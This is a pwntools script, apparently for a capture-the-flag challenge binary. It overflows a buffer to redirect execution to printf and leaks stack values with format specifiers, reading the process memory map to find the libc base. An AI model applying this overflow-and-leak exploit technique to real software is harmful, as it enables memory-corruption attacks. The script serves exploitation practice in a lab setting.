#!/usr/bin/env python3
import os, re, time
os.environ["TERM"]="xterm"
from pwn import *
context.log_level="error"
libc = ELF("/work/waf/libc.so.6", checksec=False)
PRINTF=0x4010d4

def leak(fmt):
    p = process("/work/waf/waf/chal_remote")
    p.recvuntil(b">> ")
    pay = (b"exit"+fmt).ljust(88,b"A")+p64(PRINTF)
    assert len(pay)<=128
    p.send(pay); time.sleep(0.2)
    pid=p.pid
    maps=open(f"/proc/{pid}/maps").read()
    lb=None; ldb=None; stackb=None
    for line in maps.splitlines():
        if "libc.so.6" in line:
            b=int(line.split("-")[0],16); lb=min(lb,b) if lb else b
        if "ld.so" in line or "ld-linux" in line:
            b=int(line.split("-")[0],16); ldb=min(ldb,b) if ldb else b
    out=p.recv(timeout=1); p.close()
    return out, lb, ldb

# scan positions in small groups
libc_base=None
for grp in [(5,6,7,8),(9,10,11,12),(13,14,15,16),(17,18,19,20),(21,22,23,24)]:
    fmt=b"".join(("%d=%%%d$p " % (i,i)).encode() for i in grp)
    out,lb,ldb=leak(fmt)
    libc_base=lb
    print(f"[libc={hex(lb)} ld={hex(ldb) if ldb else '?'}] {out[:150]}")
